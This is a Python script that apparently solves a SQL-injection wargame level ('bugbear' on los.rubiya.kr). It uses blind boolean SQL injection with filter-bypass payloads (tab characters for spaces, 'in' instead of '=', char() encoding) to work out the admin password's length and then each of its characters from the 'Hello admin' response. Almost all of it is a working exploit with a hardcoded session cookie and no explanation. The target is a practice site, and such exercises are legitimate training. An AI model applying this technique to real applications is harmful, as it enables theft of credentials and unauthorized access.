import requests
import urllib

url="http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no="
session=dict(PHPSESSID="tg6nlvfgcjcmvqdrp1vu3k54o3")

pw=""
length=0

print("[*] START")

print("[*] find password's length")

for i in range(0,30):
	try:
		query=url+"1||id%09in(char(97,100,109,105,110))%26%26length(pw)%09in("+str(i)+")#"
		r=requests.post(query,cookies=session)

	except:
		print("[*] exception")
		continue

	if "Hello admin" in r.text:
		length=i
		break

print("[*] password's length : ",length)

print("[*] find password")

for j in range(1,length+1):
	for i in range(48,128):
		try:
			query=url+"1||id%09in(char(97,100,109,105,110))%26%26mid(pw,"+str(j)+",1)%09in(char("+str(i)+"))#"
			# query=url+"1||id%09in(char(97,100,109,105,110))%26%26ord(mid(pw,"+str(j)+",1))%09in("+str(i)+")#"
			r=requests.post(query,cookies=session)
		except:	
			print("[*] exception")
			continue

		if "Hello admin" in r.text:
			pw+=chr(i)
			print("[*] find: ",pw)
			break

print("[*] password: ",pw)